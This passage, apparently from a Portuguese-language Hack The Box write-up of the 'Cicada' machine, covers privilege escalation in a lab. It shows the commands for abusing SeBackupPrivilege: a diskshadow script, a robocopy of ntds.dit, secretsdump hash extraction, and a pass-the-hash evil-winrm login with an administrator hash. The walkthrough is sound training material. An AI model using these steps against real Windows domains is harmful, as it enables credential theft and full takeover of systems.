+
+<h3 id="privilege-escalation"><strong>Privilege Escalation</strong><a class="anchor" href="#privilege-escalation" aria-label="Link"></a></h3>
+<p>Na shell como <code>emily.oscars</code>, a primeira coisa que faço é verificar as permissões dentro da máquina com o comando <code>whoami /priv</code>: </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\e</span>mily.oscars.CICADA<span style="color:#ae81ff">\D</span>ocuments&gt; whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                    State
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=============================</span> <span style="color:#f92672">==============================</span> <span style="color:#f92672">=======</span>
+</span></span><span style="display:flex;"><span>SeBackupPrivilege             Back up files and directories  Enabled
+</span></span><span style="display:flex;"><span>SeRestorePrivilege            Restore files and directories  Enabled
+</span></span><span style="display:flex;"><span>SeShutdownPrivilege           Shut down the system           Enabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\e</span>mily.oscars.CICADA<span style="color:#ae81ff">\D</span>ocuments&gt;</span></span></code></pre></div><p>Pesquisando sobre esses privilégios, encontro documentos que demonstrar como é possível escalar privilégios usando dessas permissões.</p>
+<p>Criamos um arquivo qualquer com as instruções:</p>
+<pre tabindex="0"><code>set context persistent nowriters
+add volume c: alias raj
+create
+expose %raj% z:</code></pre><figure><img src="/assets/image%20%28192%29.png">
+</figure>
+
+<p>Importamos o arquivo para o servidor:</p>
+<figure><img src="/assets/image%20%28193%29.png">
+</figure>
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\T</span>emp&gt; upload /home/art/Projects/CTF/htb/season-6/cicada/docs/file.abc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Uploading /home/art/Projects/CTF/htb/season-6/cicada/docs/file.abc to C:<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\f</span>ile.abc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Data: <span style="color:#ae81ff">112</span> bytes of <span style="color:#ae81ff">112</span> bytes copied
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Upload successful!
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\T</span>emp&gt; ls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\T</span>emp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                 LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                 -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----         2/16/2025  12:29 PM             <span style="color:#ae81ff">84</span> file.abc
+</span></span><span style="display:flex;"><span>-a----         2/16/2025   6:19 AM          <span style="color:#ae81ff">49152</span> sam.hive
+</span></span><span style="display:flex;"><span>-a----         2/16/2025   6:19 AM       <span style="color:#ae81ff">18518016</span> system.hive
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\T</span>emp&gt;</span></span></code></pre></div><p>Usamos agora o <code>diskshadow</code> para executar as instruções no arquivo que subimos, onde ele vai criar um disco virtual Z que é um clone do disco C:</p>
+<figure><img src="/assets/image%20%28195%29.png">
+</figure>
+
+<p>Agora usamos o <code>robocopy</code> para copiar os arquivos do Disco virtual para o nosso diretório com <code>robocopy /b z:\windows\ntds . ntds.dit</code>:<br></p>
+<figure><img src="/assets/image%20%28196%29.png">
+</figure>
+
+<p>Com um comando de <code>reg save</code> conseguimos extrair o system de dentro do <code>ntds.dit</code>, e baixamos os arquivos para nossa máquina :</p>
+<figure><img src="/assets/image%20%28197%29.png">
+</figure>
+
+<p>Com o system hive e o <code>ntds.dit</code> em mãos, podemos usar o <code>secretsdump</code> do framework <code>impacket</code> e extrair as hashes desse arquivo:</p>
+<figure><img src="/assets/image%20%28198%29.png">
+</figure>
+
+<p>Agora com a Hash do administrador, podemos logar com esse acesso usando <code>Pass the Hash</code> e conseguir acesso administrativo no servidor:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜ evil-winrm -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i 10.10.11.35
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span style="color:#f92672">()</span> <span style="color:#66d9ef">function</span> is unimplemented on this machine
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
+</span></span><span style="display:flex;"><span>cicada<span style="color:#ae81ff">\a</span>dministrator
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt;</span></span></code></pre></div><figure><img src="/assets/image%20%28199%29.png">
+</figure>
+
+<p>E com isso podemos pegar a flag de root e terminar o laboratório.</p>
+<figure><img src="/assets/image%20%28200%29.png">
+</figure>
+
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/ctf/hack-the-box/machines/certified/" class="flex align-center">
+        <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#backward"></use></svg>
+        <span>Certified</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/ctf/hack-the-box/machines/monitorsthree/" class="flex align-center">
+        <span>Monitorsthree</span>
+        <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#forward"></use></svg>
+      </a>
+    
+    </span>
+  </div>
+
+ 
+        
+  
+ 
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay" aria-hidden="true"></label>
+    </main>
+
+    
+  
+  <aside class="book-toc" aria-label="Table of Contents">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#recon">Recon</a></li>
+        <li><a href="#privilege-escalation"><strong>Privilege Escalation</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </div>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
